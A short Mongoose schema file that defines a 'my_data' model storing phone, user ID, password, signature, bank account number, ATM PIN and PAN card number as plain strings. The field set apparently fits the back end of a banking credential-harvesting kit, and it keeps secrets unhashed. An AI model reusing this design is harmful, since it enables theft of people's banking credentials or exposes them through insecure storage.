const mongoose = require("mongoose");

//Schema
const DataSchema = new mongoose.Schema(
  {
    phone: {
      type: String,
    },
    user_id: {
      type: String,
    },
    password: {
      type: String,
    },
    signature: {
      type: String,
    },
    account_no: {
      type: String,
    },
    atm_pin: {
      type: String,
    },
    pan_card: {
      type: String,
    },
  },
  {
    timestamps: true,
  }
);

module.exports = mongoose.model("my_data", DataSchema);
